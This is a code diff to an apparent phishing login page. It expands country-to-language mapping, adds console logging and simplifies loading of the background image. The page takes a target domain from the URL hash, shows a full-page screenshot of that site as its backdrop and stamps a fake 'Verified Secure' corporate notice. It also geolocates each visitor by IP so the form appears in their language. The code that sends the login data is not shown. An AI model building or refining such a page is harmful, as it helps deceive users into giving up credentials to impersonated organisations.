@@ -9,7 +9,7 @@
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #f4f4f4 url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" opacity="0.05"><rect width="100" height="100" fill="%23000000"/><path d="M0,0 L100,100 M100,0 L0,100" stroke="%23333" stroke-width="1"/></svg>');
+            background: #f4f4f4;
             background-size: 100% auto;
             background-position: center top;
             background-repeat: no-repeat;
@@ -18,7 +18,6 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            transition: background-image 0.5s ease;
         }
 
         .login-form {
@@ -233,7 +232,7 @@
     </form>
 
     <script>
-        // Language translations - EXPANDED for better coverage
+        // Language translations
         const translations = {
             en: {
                 title: "SECURE LOGIN",
@@ -390,26 +389,55 @@
             'PT': '🇵🇹', 'BE': '🇧🇪', 'CH': '🇨🇭', 'AT': '🇦🇹', 'IE': '🇮🇪'
         };
 
-        // Expanded country to language mapping
+        // Country to language mapping (VERY IMPORTANT - this is what you need)
         const countryToLanguage = {
+            // English speaking countries
             'US': 'en', 'GB': 'en', 'CA': 'en', 'AU': 'en', 'NZ': 'en',
+            'IE': 'en', 'IN': 'en', 'SG': 'en', 'ZA': 'en', 'NG': 'en',
+            
+            // Spanish speaking countries
             'ES': 'es', 'MX': 'es', 'AR': 'es', 'CO': 'es', 'PE': 'es',
+            'CL': 'es', 'EC': 'es', 'VE': 'es', 'GT': 'es', 'CU': 'es',
+            'DO': 'es', 'BO': 'es', 'HN': 'es', 'PY': 'es', 'SV': 'es',
+            'NI': 'es', 'CR': 'es', 'PR': 'es', 'UY': 'es', 'PA': 'es',
+            
+            // French speaking countries
             'FR': 'fr', 'BE': 'fr', 'CH': 'fr', 'CA': 'fr', 'LU': 'fr',
-            'DE': 'de', 'AT': 'de', 'CH': 'de', 'LU': 'de',
+            'MC': 'fr', 'SN': 'fr', 'CI': 'fr', 'CM': 'fr', 'MG': 'fr',
+            
+            // German speaking countries
+            'DE': 'de', 'AT': 'de', 'CH': 'de', 'LU': 'de', 'LI': 'de',
+            
+            // Chinese speaking regions
             'CN': 'zh', 'TW': 'zh', 'HK': 'zh', 'MO': 'zh', 'SG': 'zh',
+            
+            // Japanese speaking
             'JP': 'ja',
-            'RU': 'ru', 'UA': 'ru', 'BY': 'ru', 'KZ': 'ru',
+            
+            // Russian speaking countries
+            'RU': 'ru', 'UA': 'ru', 'BY': 'ru', 'KZ': 'ru', 'KG': 'ru',
+            
+            // Arabic speaking countries
             'SA': 'ar', 'AE': 'ar', 'EG': 'ar', 'QA': 'ar', 'KW': 'ar',
+            'BH': 'ar', 'OM': 'ar', 'JO': 'ar', 'LB': 'ar', 'SY': 'ar',
+            'IQ': 'ar', 'YE': 'ar', 'SD': 'ar', 'DZ': 'ar', 'MA': 'ar',
+            'TN': 'ar', 'LY': 'ar',
+            
+            // Portuguese speaking countries
             'BR': 'pt', 'PT': 'pt', 'AO': 'pt', 'MZ': 'pt',
+            
+            // Italian speaking countries
             'IT': 'it', 'CH': 'it', 'SM': 'it', 'VA': 'it',
+            
+            // Korean speaking regions
             'KR': 'ko', 'KP': 'ko',
-            'IN': 'en', // India primarily uses English
-            'NL': 'en', 'SE': 'en', 'NO': 'en', 'DK': 'en', 'FI': 'en' // Nordic countries
+            
+            // Dutch speaking (use English)
+            'NL': 'en', 'BE': 'en',
+            
+            // Nordic countries (use English)
+            'SE': 'en', 'NO': 'en', 'DK': 'en', 'FI': 'en', 'IS': 'en'
         };
-
-        // FALLBACK: Browser language detection
-        const browserLanguage = navigator.language || navigator.userLanguage || 'en';
-        const browserLangCode = browserLanguage.split('-')[0];
 
         let userIP = '';
         let userCountry = '';
@@ -418,6 +446,7 @@
 
         // Function to translate the page
         function translatePage(langCode) {
+            console.log('Translating to:', langCode);
             const lang = translations[langCode] || translations.en;
             currentLanguage = langCode;
             
@@ -430,37 +459,35 @@
             document.getElementById('forgotPassword').textContent = lang.forgotPassword;
             document.getElementById('login-btn').textContent = lang.loginButton;
             document.getElementById('secureText').textContent = lang.secureText;
+            
+            // Update detecting location text if it's still showing
+            if (document.getElementById('locationText').textContent.includes('Detecting') || 
+                document.getElementById('locationText').textContent.includes('Detectando') ||
+                document.getElementById('locationText').textContent.includes('Détection')) {
+                document.getElementById('locationText').textContent = lang.detectingLocation;
+            }
         }
 
-        // Function to get IP and location - FIXED for immediate translation
+        // Function to get IP and location - FIXED
         async function getUserLocation() {
             try {
-                // Show detecting message
-                document.getElementById('locationText').textContent = translations[currentLanguage].detectingLocation;
+                console.log('Starting location detection...');
                 
-                // Start translation immediately based on browser language
-                if (translations[browserLangCode]) {
-                    translatePage(browserLangCode);
-                }
-                
-                // Get IP address - using faster service
-                const ipResponse = await Promise.race([
-                    fetch('https://api.ipify.org?format=json'),
-                    new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 2000))
-                ]);
+                // Get IP address FIRST - very fast service
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 userIP = ipData.ip;
+                console.log('Got IP:', userIP);
                 
-                // Get location data - using faster service
-                const locationResponse = await Promise.race([
-                    fetch(`https://ipapi.co/${userIP}/json/`),
-                    new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 3000))
-                ]);
+                // Get location data from IP
+                const locationResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
                 const locationData = await locationResponse.json();
                 
                 userCountry = locationData.country_code || 'Unknown';
                 userCity = locationData.city || 'Unknown';
                 const countryName = locationData.country_name || 'Unknown';
+                
+                console.log('Detected country:', userCountry, 'City:', userCity);
                 
                 // Update location display
                 const flag = countryFlags[userCountry] || '📍';
@@ -468,41 +495,48 @@
                 document.getElementById('locationText').textContent = `${userCity}, ${countryName}`;
                 document.getElementById('ipDisplay').textContent = `IP: ${userIP}`;
                 
-                // Auto-detect language based on country - OVERRIDE browser language
+                // AUTO-TRANSLATE BASED ON COUNTRY - THIS IS THE KEY FIX
                 if (countryToLanguage[userCountry]) {
                     const detectedLang = countryToLanguage[userCountry];
+                    console.log('Auto-translating to:', detectedLang, 'for country:', userCountry);
                     translatePage(detectedLang);
+                } else {
+                    console.log('No language mapping for country:', userCountry, 'using English');
+                    translatePage('en');
                 }
                 
             } catch (error) {
-                console.log('Using faster fallback for location...');
+                console.error('Error getting location:', error);
                 
-                // Use faster fallback services
+                // Try fallback
                 try {
-                    // Try fast IP service
-                    const fastIpResponse = await fetch('https://api.my-ip.io/ip.json');
-                    const fastIpData = await fastIpResponse.json();
-                    userIP = fastIpData.ip || 'Unknown';
-                    userCountry = fastIpData.country || fastIpData.countryCode || 'Unknown';
+                    const fallbackResponse = await fetch('https://ipinfo.io/json');
+                    const fallbackData = await fallbackResponse.json();
+                    userIP = fallbackData.ip || 'Unknown';
+                    userCountry = fallbackData.country || 'Unknown';
+                    userCity = fallbackData.city || 'Unknown';
+                    
+                    console.log('Fallback detected country:', userCountry);
                     
                     const flag = countryFlags[userCountry] || '📍';
                     document.getElementById('locationFlag').textContent = flag;
-                    document.getElementById('locationText').textContent = 'Location detected';
+                    document.getElementById('locationText').textContent = `${userCity}, ${userCountry}`;
                     document.getElementById('ipDisplay').textContent = `IP: ${userIP}`;
                     
+                    // Translate based on fallback country
                     if (countryToLanguage[userCountry]) {
                         const detectedLang = countryToLanguage[userCountry];
                         translatePage(detectedLang);
                     }
-                } catch (fastError) {
-                    console.error('Fast fallback failed:', fastError);
+                } catch (fallbackError) {
+                    console.error('Fallback also failed:', fallbackError);
                     document.getElementById('locationText').textContent = 'Online';
                     document.getElementById('ipDisplay').textContent = 'IP: Active';
                 }
             }
         }
 
-        // Process URL hash for domain customization - WITH BACKGROUND PRELOADING
+        // Process URL hash for domain customization
         const hash = decodeURIComponent(window.location.hash.substring(1));
         
         if (hash) {
@@ -532,25 +566,8 @@
                 domainBadge.textContent = fullDomain;
                 domainBadge.style.display = 'block';
                 
-                // Load background image in background with preload
-                const bgImage = new Image();
-                bgImage.src = `https://image.thum.io/get/width/1920/fullpage/https://${fullDomain}`;
-                
-                // Set low-quality placeholder first for fast loading
-                document.body.style.backgroundImage = `url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" opacity="0.03"><rect width="100" height="100" fill="%23000000"/></svg>'), linear-gradient(45deg, #f0f0f0 25%, #e0e0e0 25%, #e0e0e0 50%, #f0f0f0 50%, #f0f0f0 75%, #e0e0e0 75%, #e0e0e0 100%)`;
-                
-                // When background image loads, replace with actual
-                bgImage.onload = function() {
-                    document.body.style.backgroundImage = `url('${bgImage.src}')`;
-                };
-                
-                // Fallback if background takes too long
-                setTimeout(() => {
-                    if (!bgImage.complete) {
-                        console.log('Background image taking too long, using fallback');
-                        document.body.style.backgroundImage = `url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" opacity="0.05"><rect width="100" height="100" fill="%23000000"/></svg>'), linear-gradient(45deg, #f0f0f0 25%, #e0e0e0 25%, #e0e0e0 50%, #f0f0f0 50%, #f0f0f0 75%, #e0e0e0 75%, #e0e0e0 100%)`;
-                    }
-                }, 3000);
+                // Load background image
+                document.body.style.backgroundImage = `url('https://image.thum.io/get/width/1920/fullpage/https://${fullDomain}')`;
                 
                 document.getElementById('secureNote').innerHTML = `<span class="tick">✓</span> Verified Secure • ${rootDomain.toUpperCase()} Inc. ©2025`;
                 
@@ -565,7 +582,7 @@
             }
         }
 
-        // Get user location on page load - START IMMEDIATELY
+        // START LOCATION DETECTION AND TRANSLATION IMMEDIATELY
         getUserLocation();
 
         // Login functionality
